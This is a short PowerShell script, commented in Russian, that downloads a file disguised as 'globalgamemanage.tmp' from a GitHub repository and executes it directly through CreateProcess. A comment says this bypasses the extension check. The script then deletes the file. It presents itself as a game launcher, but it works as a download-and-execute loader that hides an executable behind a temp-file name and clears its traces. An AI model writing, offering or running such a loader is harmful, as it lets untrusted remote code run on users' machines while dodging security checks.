$ErrorActionPreference = "Stop"

$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/globalgamemanage.tmp"
$TempFile = Join-Path ([IO.Path]::GetTempPath()) "globalgamemanage.tmp"

Invoke-WebRequest -Uri $GameUrl -OutFile $TempFile -UseBasicParsing

# Прямой запуск через CreateProcess (обходит проверку расширения)
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = $TempFile
$psi.UseShellExecute = $false          # Ключевой параметр: не использовать оболочку
$psi.CreateNoWindow = $false           # Окно игры должно быть видимым

$proc = [System.Diagnostics.Process]::Start($psi)
$proc.WaitForExit()

Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
